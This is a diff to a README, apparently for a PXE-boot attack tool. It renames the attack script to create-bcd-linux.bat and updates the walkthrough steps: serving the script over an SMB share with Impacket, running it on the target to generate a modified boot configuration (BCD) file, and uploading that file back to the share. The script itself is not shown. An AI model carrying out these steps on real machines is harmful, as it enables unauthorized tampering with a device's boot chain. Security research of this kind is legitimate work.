@@ -81,7 +81,7 @@ cd -
 
 ### SMB Server
 
-Start a SMB server from where the `create-bcd.bat` attack script can be downloaded from and the resulting, device-specific BCD can be uploaded to. Impacket's `smbserver.py` works great for that:
+Start a SMB server from where the `create-bcd-linux.bat` attack script can be downloaded from and the resulting, device-specific BCD can be uploaded to. Impacket's `smbserver.py` works great for that:
 
 ```
 cd pxe && ./start-smb.sh
@@ -126,17 +126,17 @@ cd %TEMP%
 
 Copy attack script to temporary directory:
 ```
-copy S:\create-bcd.bat .
+copy S:\create-bcd-linux.bat .
 ```
 
-Execute attacker script to generate a `BCD_modded` file:
+Execute attacker script to generate a modified BCD file:
 ```
-.\create-bcd.bat
+.\create-bcd-linux.bat
 ```
 
 Transfer the modified boot configuration to the SMB share:
 ```
-copy BCD_modded S:\BCD
+copy BCD_linux S:\BCD
 ```
 
 > [!note]
